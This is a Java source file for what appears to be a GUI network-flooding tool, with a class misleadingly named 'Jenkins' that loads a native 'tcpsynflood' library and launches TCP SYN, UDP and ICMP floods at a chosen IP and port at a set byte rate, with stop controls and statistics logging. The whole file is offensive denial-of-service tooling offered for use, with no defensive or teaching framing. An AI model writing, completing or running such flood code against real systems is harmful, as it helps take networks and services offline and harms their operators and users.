package com.yourpackage;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.atomic.AtomicLong;
import java.util.logging.Logger;

import javafx.application.Platform;
import javafx.scene.control.TextArea;

public class Jenkins {
    private static final byte[] DEFAULT_PAYLOAD = new byte[1300];
    private static final Logger logger = Logger.getLogger(Jenkins.class.getName());
    private volatile boolean stopAttack = false;
    private String sourceIp;
    private byte[] sourceMac;
    private TextArea logArea;
    private List<Thread> activeThreads = new ArrayList<>();
    private volatile boolean attackRunning = false;
    private IcmpFlood icmpFlood;
    private String targetIp;
    private String attackType;
    private AttackLogger attackLogger;
    private AtomicLong totalPacketsSent = new AtomicLong(0);
    private long startTime;
    private long bytesPerSecond;

    private native boolean nativeTcpSynFlood(String sourceIp, String sourceMac, 
                                           String targetIp, String targetMac, 
                                           int targetPort, long bytesPerSecond);

    static {
        try {
            String libraryPath = "native/tcpsynflood.dll";
            if (!loadLibrary(libraryPath)) {
                throw new RuntimeException("Failed to load native libraries");
            }
        } catch (Exception e) {
            throw new RuntimeException("Failed to load native libraries", e);
        }
    }

    private static boolean loadLibrary(String libraryPath) {
        try {
            // First try loading from the native directory
            System.load(new File(libraryPath).getAbsolutePath());
            return true;
        } catch (UnsatisfiedLinkError e1) {
            try {
                // If that fails, try loading from the resources
                InputStream in = Jenkins.class.getResourceAsStream("/" + libraryPath);
                if (in == null) {
                    return false;
                }
                
                File tempFile = File.createTempFile("tcpsynflood", ".dll");
                tempFile.deleteOnExit();
                
                Files.copy(in, tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                System.load(tempFile.getAbsolutePath());
                return true;
            } catch (Exception e2) {
                e2.printStackTrace();
                return false;
            }
        }
    }

    public void resetAttack() {
        stopAttack = false;
    }

    public boolean isAttackRunning() {
        return attackRunning;
    }

    public void tcpSynFlood(String targetIp, int targetPort, long bytesPerSecond) {
        stopAttack = false;
        attackRunning = true;
        this.targetIp = targetIp;
        this.attackType = "TCP SYN Flood";
        this.bytesPerSecond = bytesPerSecond;
        startTime = System.nanoTime();
        totalPacketsSent.set(0);
        
        String targetMac = getMacAddress(targetIp);
        attackLogger = new AttackLogger("TCP SYN", targetIp, targetMac, sourceIp, 
                                      bytesToMacString(sourceMac), bytesPerSecond, logArea);
        
        Thread thread = new Thread(() -> {
            try {
                String sourceMacStr = bytesToMacString(sourceMac);
                long startTimeMs = System.currentTimeMillis();
                log(String.format("Initiated TCP SYN flooding for %d seconds", bytesPerSecond / 1_000_000));
                
                while (!stopAttack) {
                    if (nativeTcpSynFlood(sourceIp, sourceMacStr, targetIp, targetMac, targetPort, bytesPerSecond)) {
                        long currentPacketCount = totalPacketsSent.incrementAndGet();
                        double currentRate = (currentPacketCount * 54 * 8.0) / 
                            ((System.nanoTime() - startTime) / 1_000_000_000.0) / 1_000_000;
                        double targetRate = (bytesPerSecond * 8.0) / 1_000_000;
                        double totalDataSent = currentPacketCount * 54;
                        
                        logAttackStats("TCP SYN", targetIp, currentRate, targetRate, currentPacketCount, totalDataSent);
                    }
                    Thread.sleep(1);
                }
            } catch (Exception e) {
                log("Error in TCP SYN flood thread: " + e.getMessage());
            } finally {
                attackRunning = false;
            }
        });
        
        thread.setDaemon(true);
        activeThreads.add(thread);
        thread.start();
    }

    public void stopAttack() {
        stopAttack = true;
        
        if (attackLogger != null) {
            attackLogger.logStop();
            attackLogger = null;
        }
        
        if (icmpFlood != null) {
            icmpFlood.stop();
            icmpFlood = null;
        }
        
        for (Thread thread : new ArrayList<>(activeThreads)) {
            try {
                thread.join(2000);
                if (thread.isAlive()) {
                    thread.interrupt();
                }
            } catch (InterruptedException e) {
                thread.interrupt();
            }
        }
        activeThreads.clear();
    }

    public void setSourceIp(String ip) {
        this.sourceIp = ip;
    }

    public void setSourceMac(byte[] mac) {
        this.sourceMac = mac;
    }

    private String bytesToMacString(byte[] mac) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < mac.length; i++) {
            sb.append(String.format("%02X%s", mac[i] & 0xFF, (i < mac.length - 1) ? ":" : ""));
        }
        return sb.toString();
    }

    // Method to log a message
    public void log(String message) {
        if (logArea != null) {
            Platform.runLater(() -> logArea.appendText(message + "\n"));
        }
    }

    public String getMacAddress(String ipAddress) {
        try {
            InetAddress addr = InetAddress.getByName(ipAddress);
            
            // Try ARP for all addresses
            String[] cmd;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"arp", "-a", ipAddress};
            } else {
                cmd = new String[]{"arp", ipAddress};
            }
            
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains(ipAddress)) {
                    String[] parts = line.split("\\s+");
                    for (String part : parts) {
                        if (part.matches("([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")) {
                            return part.toUpperCase();
                        }
                    }
                }
            }
            
            // If ARP fails, try NetworkInterface for local addresses
            if (addr.isLinkLocalAddress() || addr.isSiteLocalAddress()) {
                NetworkInterface ni = NetworkInterface.getByInetAddress(addr);
                if (ni != null) {
                    byte[] mac = ni.getHardwareAddress();
                    if (mac != null) {
                        return formatMacAddress(mac);
                    }
                }
            }
            
            return "MAC address not found";
        } catch (Exception e) {
            e.printStackTrace();
            return "Error: " + e.getMessage();
        }
    }

    private String formatMacAddress(byte[] mac) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < mac.length; i++) {
            sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? ":" : ""));
        }
        return sb.toString();
    }

    // Assume getDestinationMacAddress is implemented elsewhere
    private byte[] getDestinationMacAddress(InetAddress targetAddress) {
        // Implementation goes here
        return null; // Placeholder
    }

    // Setter for logArea
    public void setLogArea(TextArea logArea) {
        this.logArea = logArea;
    }

    // Other methods...
    public void udpFlood(String targetIp, int targetPort, long bytesPerSecond) {
        stopAttack = false;
        attackRunning = true;
        this.targetIp = targetIp;
        this.attackType = "UDP Flood";
        this.bytesPerSecond = bytesPerSecond;
        
        String targetMac = getMacAddress(targetIp);
        attackLogger = new AttackLogger("UDP", targetIp, targetMac, sourceIp, 
                                      bytesToMacString(sourceMac), bytesPerSecond, logArea);
        
        Thread thread = new Thread(() -> {
            UdpFlood udpFlood = null;
            try {
                udpFlood = new UdpFlood(targetIp, targetPort, bytesPerSecond);
                udpFlood.start();
                
                while (!stopAttack) {
                    udpFlood.updateStats(this);
                    Thread.sleep(1000);
                }
            } catch (Exception e) {
                log("Error in UDP flood thread: " + e.getMessage());
            } finally {
                if (udpFlood != null) {
                    udpFlood.stop();
                }
                attackRunning = false;
            }
        });
        
        thread.setDaemon(true);
        activeThreads.add(thread);
        thread.start();
    }

    public void icmpFlood(String targetIp, long bytesPerSecond) {
        stopAttack = false;
        attackRunning = true;
        this.targetIp = targetIp;
        this.attackType = "ICMP Flood";
        this.bytesPerSecond = bytesPerSecond;
        
        String targetMac = getMacAddress(targetIp);
        attackLogger = new AttackLogger("ICMP", targetIp, targetMac, sourceIp, 
                                      bytesToMacString(sourceMac), bytesPerSecond, logArea);
        
        Thread thread = new Thread(() -> {
            try {
                icmpFlood = new IcmpFlood(targetIp, bytesPerSecond);
                icmpFlood.start();
                
                while (!stopAttack) {
                    icmpFlood.updateStats(this);
                    Thread.sleep(1000);
                }
            } catch (Exception e) {
                log("Error in ICMP flood thread: " + e.getMessage());
            } finally {
                if (icmpFlood != null) {
                    icmpFlood.stop();
                }
                attackRunning = false;
                stopAttack = false;
            }
        });
        
        thread.setDaemon(true);
        activeThreads.add(thread);
        thread.start();
    }

    public void logAttackStats(String attackType, String targetIp, double currentRate, double targetRate, 
                              long totalPackets, double totalDataSent) {
        if (attackLogger == null) {
            String targetMac = getMacAddress(targetIp);
            attackLogger = new AttackLogger(attackType, targetIp, targetMac, sourceIp, 
                                          bytesToMacString(sourceMac), bytesPerSecond, logArea);
        }
        attackLogger.logStats(currentRate, targetRate, totalPackets, totalDataSent);
    }

}
